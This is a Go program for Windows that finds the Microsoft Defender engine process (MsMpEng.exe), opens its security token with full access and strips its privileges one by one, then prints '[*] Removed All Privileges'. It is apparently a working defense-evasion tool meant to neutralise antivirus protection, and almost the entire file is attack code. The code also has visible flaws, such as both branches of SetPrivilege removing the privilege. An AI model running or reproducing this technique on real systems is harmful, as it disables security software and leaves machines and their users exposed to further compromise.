package main

import (
	"bytes"
	"fmt"
	"golang.org/x/sys/windows"
	"log"
	"reflect"
	"strings"
	"syscall"
	"unsafe"
)

const (
	Th32cs_Snapprpcess = 0x00000002
	SE_DEBUG_NAME                  = "SeDebugPrivilege"
	SE_CHANGE_NOTIFY_NAME          = "SeChangeNotifyPrivilege"
	SE_TCB_NAME                    = "SeTcbPrivilege"
	SE_IMPERSONATE_NAME            = "SeImpersonatePrivilege"
	SE_LOAD_DRIVER_NAME            = "SeLoadDriverPrivilege"
	SE_RESTORE_NAME                = "SeRestorePrivilege"
	SE_BACKUP_NAME                 = "SeBackupPrivilege"
	SE_SECURITY_NAME               = "SeSecurityPrivilege"
	SE_SYSTEM_ENVIRONMENT_NAME     = "SeSystemEnvironmentPrivilege"
	SE_INCREASE_QUOTA_NAME         = "SeIncreaseQuotaPrivilege"
	SE_TAKE_OWNERSHIP_NAME         = "SeTakeOwnershipPrivilege"
	SE_INC_BASE_PRIORITY_NAME      = "SeIncreaseBasePriorityPrivilege"
	SE_SHUTDOWN_NAME               = "SeShutdownPrivilege"
	SE_ASSIGNPRIMARYTOKEN_NAME     = "SeAssignPrimaryTokenPrivilege"
	SE_PRIVILEGE_REMOVED            = 0X00000004
)

type WindowsProcess struct {
	ProcessID       int
	ParentProcessID int
	Exe             string
}


func newWindowsProcess(e *syscall.ProcessEntry32) WindowsProcess {
	// Find when the string ends for decoding
	end := 0
	for {
		if e.ExeFile[end] == 0 {
			break
		}
		end++
	}

	return WindowsProcess{
		ProcessID:       int(e.ProcessID),
		ParentProcessID: int(e.ParentProcessID),
		Exe:             syscall.UTF16ToString(e.ExeFile[:end]),
	}
}

func Processes() ([]WindowsProcess, error) {
	handle, err := syscall.CreateToolhelp32Snapshot(Th32cs_Snapprpcess, 0)
	if err != nil {
		return nil, err
	}
	defer syscall.CloseHandle(handle)

	var entry syscall.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	// get the first process
	err = syscall.Process32First(handle, &entry)
	if err != nil {
		return nil, err
	}

	results := make([]WindowsProcess, 0, 50)
	for {
		results = append(results, newWindowsProcess(&entry))

		err = syscall.Process32Next(handle, &entry)
		if err != nil {
			// windows sends ERROR_NO_MORE_FILES on last process
			if err == syscall.ERROR_NO_MORE_FILES {
				return results, nil
			}
			return nil, err
		}
	}
}

func FindProcessByName(processes []WindowsProcess, name string) *WindowsProcess {
	for _, p := range processes {
		if bytes.Contains([]byte(strings.ToUpper(p.Exe)),     []byte(strings.ToUpper(name))) {
			return &p
		}
	}
	return nil
}

func SetPrivilege(hToken windows.Token,lpszPrivilege *uint16,bEnablePrivilege bool)(PanDan bool){
	//var hToken syscall.Token
	var tp windows.Tokenprivileges
	var luid windows.LUID
	err :=windows.LookupPrivilegeValue(nil, lpszPrivilege, &luid)
	if err != nil {
		log.Fatal(err)
	}
	tp.PrivilegeCount = 1
	tp.Privileges[0].Luid = luid
	if !bEnablePrivilege{
		tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED
	}else{
		tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED
	}

	// Enable the privilege or disable all privileges.
	var tokenPriviledge windows.Tokenprivileges
	tokenPrivLen := uint32(unsafe.Sizeof(tokenPriviledge))
	err = windows.AdjustTokenPrivileges(hToken, false, &tp, tokenPrivLen, nil, nil)
	if err != nil {
		log.Fatal(err)				
		return false
	}else{
		return true
	}
}

func main() {
	parentName := "MsMpEng.exe"
	procS, _ := Processes()
	ParentInfo := FindProcessByName(procS, parentName) 
	if ParentInfo != nil {
		pid := uint32(ParentInfo.ProcessID)	
		fmt.Println(pid)
		const ProcessQueryInformation = windows.PROCESS_QUERY_LIMITED_INFORMATION
		//pHandle, _ := syscall.OpenProcess(ProcessQueryInformation, false, pid)
		pHandle, err := windows.OpenProcess(ProcessQueryInformation, false, pid)	
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(reflect.TypeOf(pHandle))
		//uintpHandle := uintptr(pHandle)
		var ptoken windows.Token

		err = windows.OpenProcessToken(pHandle, windows.TOKEN_ALL_ACCESS, &ptoken)
		if err != nil {
			log.Fatal(err)
		}

		privStr, _ := windows.UTF16PtrFromString(SE_DEBUG_NAME)

		var luid windows.LUID
		err = windows.LookupPrivilegeValue(nil,privStr,&luid)
		if err != nil {
			log.Fatal(err)
		}

		var tokenPriviledges windows.Tokenprivileges
		tokenPriviledges.PrivilegeCount = 1
		tokenPriviledges.Privileges[0].Luid = luid
		tokenPriviledges.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED

		// Adjust token privs
		tokPrivLen := uint32(unsafe.Sizeof(tokenPriviledges))
		log.Println(fmt.Sprintf("[+] Current token length is: %d", tokPrivLen))

		err = windows.AdjustTokenPrivileges(ptoken, false, &tokenPriviledges, tokPrivLen, nil, nil)
		if err != nil {
			log.Fatal(err)
		}

		// Remove all privileges
		privStr0, _ := windows.UTF16PtrFromString(SE_DEBUG_NAME)
		SetPrivilege(ptoken,privStr0,true)
		privStr0, _ = windows.UTF16PtrFromString(SE_CHANGE_NOTIFY_NAME)
		SetPrivilege(ptoken,privStr0,true)
		privStr0, _ = windows.UTF16PtrFromString(SE_TCB_NAME)
		SetPrivilege(ptoken,privStr0,true)
		privStr0, _ = windows.UTF16PtrFromString(SE_IMPERSONATE_NAME)
		SetPrivilege(ptoken,privStr0,true)
		privStr0, _ = windows.UTF16PtrFromString(SE_RESTORE_NAME)
		SetPrivilege(ptoken,privStr0,true)
		privStr0, _ = windows.UTF16PtrFromString(SE_BACKUP_NAME)
		SetPrivilege(ptoken,privStr0,true)
		privStr0, _ = windows.UTF16PtrFromString(SE_SECURITY_NAME)
		SetPrivilege(ptoken,privStr0,true)
		privStr0, _ = windows.UTF16PtrFromString(SE_SYSTEM_ENVIRONMENT_NAME)
		SetPrivilege(ptoken,privStr0,true)
		privStr0, _ = windows.UTF16PtrFromString(SE_INCREASE_QUOTA_NAME)
		SetPrivilege(ptoken,privStr0,true)
		privStr0, _ = windows.UTF16PtrFromString(SE_TAKE_OWNERSHIP_NAME)
		SetPrivilege(ptoken,privStr0,true)
		privStr0, _ = windows.UTF16PtrFromString(SE_INC_BASE_PRIORITY_NAME)
		SetPrivilege(ptoken,privStr0,true)
		privStr0, _ = windows.UTF16PtrFromString(SE_SHUTDOWN_NAME)
		SetPrivilege(ptoken,privStr0,true)
		privStr0, _ = windows.UTF16PtrFromString(SE_ASSIGNPRIMARYTOKEN_NAME)
		SetPrivilege(ptoken,privStr0,true)

		fmt.Println("[*] Removed All Privileges")

	}
}
